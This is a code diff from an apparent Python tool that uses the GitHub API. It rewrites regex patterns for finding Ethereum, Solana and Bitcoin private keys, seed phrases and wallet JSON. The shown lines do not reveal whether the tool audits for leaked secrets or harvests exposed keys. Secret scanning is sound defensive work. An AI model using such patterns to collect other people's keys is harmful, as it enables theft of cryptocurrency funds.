@@ -14,11 +14,13 @@ HEADERS = {"Accept": "application/vnd.github.v3+json"}
 
 # Regex patterns for valid private keys and seed phrases
 CRYPTO_PATTERNS = {
-    "Ethereum": r'(?<![a-fA-F0-9])0x[a-fA-F0-9]{64}(?![a-fA-F0-9])',
-    "Solana": r'(?<![A-Za-z0-9])[5KLMN][1-9A-HJ-NP-Za-km-z]{50,51}(?![A-Za-z0-9])',
-    "Bitcoin": r'(?<![A-Za-z0-9])[5KL][1-9A-HJ-NP-Za-km-z]{50,51}(?![A-Za-z0-9])',
-    "Seed Phrase": r'([a-z]+ ){11,23}[a-z]+',
+    "Ethereum": r'0x[a-fA-F0-9]{64}',  # Strict Ethereum private key format
+    "Solana": r'[5KLMN][1-9A-HJ-NP-Za-km-z]{51,52}',  # Solana private key (base58)
+    "Bitcoin": r'[5KL][1-9A-HJ-NP-Za-km-z]{51,52}',  # Bitcoin private key
+    "Seed Phrase": r'\b(?:[a-z]{3,8}\s){11,23}[a-z]{3,8}\b',  # 12-24 words
+    "Wallet JSON": r'\{.*("crypto"|"wallet"|"address"|"privateKey").*\}'  # JSON format
 }
+
 
 # Function to check GitHub API token validity
 def check_github_token(token):
